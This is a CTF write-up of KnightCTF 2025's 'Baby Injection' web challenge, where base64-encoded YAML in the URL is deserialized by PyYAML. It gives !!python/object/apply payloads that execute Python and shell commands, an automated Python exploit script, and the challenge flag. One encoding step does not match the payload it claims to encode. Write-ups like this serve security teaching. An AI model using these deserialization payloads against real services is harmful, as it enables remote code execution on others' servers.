---
title: "Baby Injection - KnightCTF 2025"
category: "web"
subcategory: "deserialization"
type: "writeup"
tags: ["web", "yaml", "deserialization", "base64", "subprocess", "knightctf", "knightctf-2025", "2025", "ctf-writeup"]
summary: "The site appears as follows:"
source:
  name: "CTFtime writeup #39827"
  url: "https://ctftime.org/writeup/39827"
ctf:
  name: "KnightCTF 2025"
  year: 2025
  challenge: "Baby Injection"
---

## Metadata

- **CTF:** KnightCTF 2025
- **Task:** Baby Injection
- **Author team:** QnQSec
- **CTFtime tags:** web, yaml
- **CTFtime:** <https://ctftime.org/writeup/39827>

---
### Challenge Description

![description](<https://i.imgur.com/xtUFiNM.png>)

### Initial Analysis

The site appears as follows:

![site](<https://i.imgur.com/jzto8RM.png>)

The first thing that immediately stands out is the site's URL:

```  
http://172.105.121.246:5990/eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=  
```

In fact, that looks like a base64 encoding. Let's try to decode it:

```bash  
echo "eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=" | base64 -d  
```

Decoding it, I got the following:

```  
yaml: Its yaml bro, hack me if you can!!!  
```

So, the decoded base64 seems to be reflected on the page, as we can see from the previous screenshot. It seems that since it mentions YAML, this could be a case of YAML insecure deserialization. In fact, looking at the request header, we can tell that everything is being executed with Python. Since Python has a library called PyYAML, we can exploit the deserialization process to achieve Remote Code Execution (RCE). 

### Exploit  
I personally used this payload:

```  
yaml: !!python/object/apply:eval ["__import__('os').listdir('.')"]  
```

But many other payloads could have been used, such as:

```  
yaml: !!python/object/apply:subprocess.getoutput ["ls -al"]  
```  
Other payloads can be found on [PayloadsAllTheThings](). So, I simply encoded it in base64:

```bash  
echo "yaml: python/object/apply:subprocess.getoutput ['ls -al']" | base64  
```

And that's how I formed the URL for injecting the "ls -al" command:

```  
http://172.105.121.246:5990/eWFtbDogcHl0aG9uL29iamVjdC9hcHBseTpzdWJwcm9jZXNzLmdldG91dHB1dCBbJ2xzIC1hbCdd  
```

By opening the URL, the command was executed on the server, listing the directories, and in doing so, I found the flag:

![flag](<https://i.imgur.com/1FsN3Jx.png>)

### Automated Exploit

I also created an automated Python exploit for extracting the flag:

```python  
import requests  
import base64  
import re

url = "http://172.105.121.246:5990/"  
payload = '''yaml: !!python/object/apply:eval ["__import__('os').listdir('.')"]'''  
print("\nFLAG: " + re.search(r'KCTF{[a-f0-9]+}', requests.get(url + base64.b64encode(payload.encode('utf-8')).decode('utf-8')).text).group(0))  
```

### Flag

```  
KCTF{d38787fb0741bd0efdad8ed01f037740}  
```
